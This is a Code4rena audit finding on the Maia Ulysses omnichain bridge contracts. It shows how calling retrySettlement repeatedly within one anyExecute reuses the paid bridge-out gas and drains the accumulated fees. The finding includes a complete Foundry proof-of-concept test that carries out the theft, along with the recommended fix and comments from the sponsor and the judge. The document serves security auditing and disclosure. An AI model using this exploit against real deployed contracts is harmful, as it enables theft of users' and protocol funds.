[H-11] An attacker can steal Accumulated Awards fromRootBridgeAgentby abusingretrySettlement()
Submitted byVoyvoda, also found byxuwinnie
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409
The Accumulated Awards insideRootBridgeAgent.solcan be stolen. The Accumulated Awards state will be compromised and awards will be stuck.
Proof of Concept
Note: An end-to-end coded PoC is at the end of the PoC section.
Gas state
The gas related state insideRootBridgeAgentconsists of:
initialGas: a checkpoint that recordsgasleft()at the start ofanyExecutethat has been called byMultichainwhen we have a cross-chain call.userFeeInfo: this is a struct that containsdepositedGaswhich is the total amount of gas that the user has paid for on aBranchChain. The struct also containsgasToBridgeOut, which is the amount of gas to be used for further cross-chain executions. The assumption is thatgasToBridgeOut < depositedGaswhich is checked at the start ofanyExecute(...).At the end ofanyExecute(...): the function_payExecutionGas()is invoked that calculates the supplied gas available for execution on the RootavaliableGas = _depositedGas - _gasToBridgeOutand then a check is performed ifavailableGasis enough to coverminExecCost, (which uses theinitialGascheckpoint and subtracts a secondgasleft()checkpoint to represent the end of execution on the Root). The difference betweenavailableGasandminExecCostis the profit for the protocol is recorded insideaccumulatedFeesstate variable.
function_payExecutionGas(uint128_depositedGas,uint128_gasToBridgeOut,uint256_initialGas,uint24_fromChain)internal{//reset initial remote execution gas and remote execution fee informationdelete(initialGas);delete(userFeeInfo);if(_fromChain==localChainId)return;//Get Available Gasuint256availableGas=_depositedGas-_gasToBridgeOut;//Get Root Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasleft());//Check if sufficient balanceif(minExecCost>availableGas) {_forceRevert();return;}//Replenish Gas_replenishGas(minExecCost);//Account for excess gasaccumulatedFees+=availableGas-minExecCost;}
Settlements
These are records of tokens that are “bridged out” (transferred) through theRootBridgeAgentto aBranchBridgeAgent. By default, when a settlement is created it is “successful”, unless the execution on the Branch Chain fails andanyFallback(...)is called on theRootBridgeAgent, which will set the settlement status as “failed”.
An example way to create a settlement, will be to “bridge out” some of the assets fromBranchBridgeAgenttoRootBridgeAgentand embed extra data that represents another bridge operation fromRootBridgeAgenttoBranchBridgeAgent. This flow passes through theMulticallRootRouterand could be the same branch agent as the first one or different. At this point, a settlement will be created. Moreover, a settlement could fail, for example, because of insufficientgasToBridgeOutprovided by the user. In that case,anyFallbackis triggered on theRootBridgeAgent, failing the settlement. At this time,retrySettlement()becomes available to call for the particular settlement.
The attack
Let’s first examine closely theretrySettlement()function:
functionretrySettlement(uint32_settlementNonce,uint128_remoteExecutionGas)externalpayable{//Update User Gas available.if(initialGas==0) {userFeeInfo.depositedGas=uint128(msg.value);userFeeInfo.gasToBridgeOut=_remoteExecutionGas;}//Clear Settlement with updated gas._retrySettlement(_settlementNonce);}
IfinitialGas == 0, it is assumed that someone directly callsretrySettlement(...)and therefore has to deposit gas (msg.value). However, ifinitialGas > 0, it is assumed thatretrySettlement(...)could be part of ananyExecute(...)call that contained instructions for theMulticallRootRouterto do the call through aVirtualAccount. Let’s assume the second scenario whereinitialGas > 0and examine the internal_retrySettlement:
First, we have the call to_manageGasOut(...), where again ifinitialGas > 0, we assume that theretrySettlement(...)is withinanyExecute; therefore, theuserFeeInfostate is already set. From there, we perform a_gasSwapOut(...)withuserFeeInfo.gasToBridgeOutwhere we swap thegasToBridgeOutamount ofwrappedNativefor gas tokens that are burned. Then, back in the internal_retrySettlement(...), the new gas is recorded in the settlement record and the message is sent to a Branch Chain viaanyCall.
The weakness here, is that after we retry a settlement withuserFeeInfo.gasToBridgeOutwe do not setuserFeeInfo.gasToBridgeOut = 0. Which if we perform only 1retrySettlement(...), it is not exploitable; however, if we embed in a singleanyExecute(...)in severalretrySettlement(...)calls, it becomes obvious that we can pay 1 time forgasToBridgeOuton a Branch Chain and use it multiple times on theRootChainto fuel the manyretrySettlement(...)calls.
The second feature that will be part of the attack, is that on a Branch Chain we get refunded for the excess ofgasToBridgeOutthat wasn’t used for execution on the Branch Chain.
function_retrySettlement(uint32_settlementNonce)internalreturns(bool) {//Get SettlementSettlementmemorysettlement=getSettlement[_settlementNonce];//Check if Settlement hasn't been redeemed.if(settlement.owner==address(0))returnfalse;//abi encodePackedbytesmemorynewGas=abi.encodePacked(_manageGasOut(settlement.toChain));//overwrite last 16bytes of callDatafor(uint256i=0;i<newGas.length;) {settlement.callData[settlement.callData.length-16+i] =newGas[i];unchecked{++i;}}SettlementstoragesettlementReference=getSettlement[_settlementNonce];//Update Gas To Bridge OutsettlementReference.gasToBridgeOut=userFeeInfo.gasToBridgeOut;//Set Settlement Calldata to send to Branch ChainsettlementReference.callData=settlement.callData;//Update Settlement StatussettlementReference.status=SettlementStatus.Success;//Retry call with additional gas_performCall(settlement.callData,settlement.toChain);//Retry Successreturntrue;}
An attacker will trigger some number ofcallOutAndBridge(...)invocations from a Branch Chain, with some assets and extra data that will callcallOutAndBridge(...)on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain). However, the attacker will set minimumdepositedGasto ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain; therefore, failing a number of settlements. The attacker will then follow with acallOutAndBridge(...)from a Branch Chain that contains extra data for theMutlicallRouterand for theVirtualAccountto callretrySettlement(...)for every “failed” settlement. Since we will have multipleretrySettlement(...)invocations inside a singleanyExecute, at some point thegasToBridgeOutsent to each settlement will become>the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem their profit on the Branch Chain, since they get a gas refund. Therefore, there will also be a mismatch betweenaccumulatedRewardsand the native currency inRootBridgeAgent, causingsweep()to revert and anyaccumulatedRewardsleft will be bricked.
Coded PoC
Copy the two functionstestGasIssueand_prepareDepositintest/ulysses-omnichain/RootTest.t.soland place them in theRootTestcontract after the setup.
Execute withforge test --match-test testGasIssue -vv.
Result: the attacker starts with1000000000000000000wei (1 ether) and has1169999892307980000wei (>1 ether) after the execution of the attack (the end number could be slightly different, depending on foundry version), which is a mismatch betweenaccumulatedRewardsand the amount of WETH in the contract.
Note - there are console logs added from the developers in some of the mock contracts. Consider commenting them out for clarity of the output.
functiontestGasIssue()public{testAddLocalTokenArbitrum();console2.log("---------------------------------------------------------");console2.log("-------------------- GAS ISSUE START---------------------");console2.log("---------------------------------------------------------");// Accumulate rewards in RootBridgeAgentaddresssome_user=address(0xAAEE);hevm.deal(some_user,1.5ether);// Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some feesbytesmemoryempty_params=abi.encode(bytes1(0x00));hevm.prank(some_user);avaxMulticallBridgeAgent.callOut{value:1.1ether}(empty_params,0);// Get the global(root) address for the avax H mock tokenaddressglobalAddress=rootPort.getGlobalTokenFromLocal(avaxMockAssethToken,avaxChainId);// Attacker starts with 1 etheraddressattacker=address(0xEEAA);hevm.deal(attacker,1ether);// Mint 1 ether of the avax mock underlying tokenhevm.prank(address(avaxPort));MockERC20(address(avaxMockAssetToken)).mint(attacker,1ether);// Attacker approves the underlying tokenhevm.prank(attacker);MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort),1ether);// Print out the amounts of WrappedNative & AccumulateAwards stateconsole2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES START",multicallBridgeAgent.accumulatedFees());// Attacker's underlying avax mock token balanceconsole2.log("Attacker underlying token balance avax",avaxMockAssetToken.balanceOf(attacker));// Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail// We will have to mock this fail since we don't have the MultiChain contracts, but the provided// Mock Anycall has anticipated for thatDepositInputmemorydeposit=_prepareDeposit();uint128remoteExecutionGas=2_000_000_000;Multicall2.Call[]memorycalls=newMulticall2.Call[](0);OutputParamsmemoryoutputParams=OutputParams(attacker,globalAddress,500,500);bytesmemoryparams=abi.encodePacked(bytes1(0x02),abi.encode(calls,outputParams,avaxChainId));console2.log("ATTACKER ETHER BALANCE START",attacker.balance);// Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall// Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)MockAnycall(local`AnyCall`Address).toggleFallback(1);// executehevm.prank(attacker);// in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.00000005ether}(params,deposit,remoteExecutionGas);// Switch to normal modeMockAnycall(local`AnyCall`Address).toggleFallback(0);// this will call anyFallback() on the Root and Fail the settlementMockAnycall(local`AnyCall`Address).testFallback();// Repeat for 1 more settlementMockAnycall(local`AnyCall`Address).toggleFallback(1);hevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.00000005ether}(params,deposit,remoteExecutionGas);MockAnycall(local`AnyCall`Address).toggleFallback(0);MockAnycall(local`AnyCall`Address).testFallback();// Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attackconsole2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",multicallBridgeAgent.accumulatedFees());// Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since// initialGas > 0 because we execute the calls as a part of an anyExecute()Multicall2.Call[]memorymalicious_calls=newMulticall2.Call[](2);bytes4selector=bytes4(keccak256("retrySettlement(uint32,uint128)"));malicious_calls[0] =Multicall2.Call({target:address(multicallBridgeAgent),callData:abi.encodeWithSelector(selector,1,0)});malicious_calls[1] =Multicall2.Call({target:address(multicallBridgeAgent),callData:abi.encodeWithSelector(selector,2,0)});// malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});outputParams=OutputParams(attacker,globalAddress,500,500);params=abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls,outputParams,avaxChainId));// At this point root now has ~1.1hevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.1ether}(params,deposit,0.09ether);// get attacker's virtual account addressaddressvaccount=address(rootPort.getUserAccount(attacker));console2.log("ATTACKER underlying balance avax",avaxMockAssetToken.balanceOf(attacker));console2.log("ATTACKER global avax h token balance root",ERC20hTokenRoot(globalAddress).balanceOf(vaccount));console2.log("ATTACKER ETHER BALANCE END",attacker.balance);console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES END",multicallBridgeAgent.accumulatedFees());console2.log("---------------------------------------------------------");console2.log("-------------------- GAS ISSUE END ----------------------");console2.log("---------------------------------------------------------");}function_prepareDeposit()internalreturns(DepositInputmemory) {// hToken addressaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);uint256amount1=500;uint256amount2=500;uint24toChain=rootChainId;returnDepositInput({hToken:addr1,token:addr2,amount:amount1,deposit:amount2,toChain:toChain});}
Recommendation
It is hard to conclude a particular fix, but consider settinguserFeeInfo.gasToBridgeOut = 0afterretrySettlementas part of the mitigation.
Assessed type
Context
0xBugsy (Maia) confirmed, but disagreed with severity and commented:
The fix recommended for this issue was saving the available gas and clearing thegasToBridgeOutafter eachmanageGasOutin order to avoid this double spending and using available gas inpayExecutionGas.
Trust (judge) commented:
Loss of yield = loss of funds. High impact from my perspective.
0xLightt (Maia) commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.